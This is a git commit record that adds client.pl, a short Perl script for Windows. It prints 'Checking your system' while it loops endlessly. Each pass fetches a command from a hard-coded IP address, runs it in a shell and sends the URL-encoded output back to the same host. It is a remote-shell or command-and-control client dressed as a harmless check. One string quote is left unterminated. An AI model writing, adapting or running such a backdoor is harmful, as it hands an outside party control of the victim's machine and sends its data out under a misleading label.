3680dc3bb1861ed77d3c39f9e88dabeded82bd85
jkosik <juraj.kosik@gmail.com>
2013-07-03 22:58:27 +0200

    Create client.pl

---
+++ client.pl
@@ -0,0 +1,17 @@
+#powered by jreisinger :);
+
+use Win32::Internet;
+use URI::Encode qw(uri_encode uri_decode);;
+
+print "Checking your system ";
+while ( 1 ) {
+my $INET = new Win32::Internet();
+my $cmd = $INET->FetchURL("http://195.146.133.198/httpsh/actual.txt);
+my $out = sprintf "%s\n\n", scalar localtime();
+for my $line (`$cmd`) {
+$out .= uri_encode($line);
+}
+$INET->FetchURL("http://195.146.133.198/httpsh/output.php?out=$out");
+sleep 2;
+    print ".";
+}
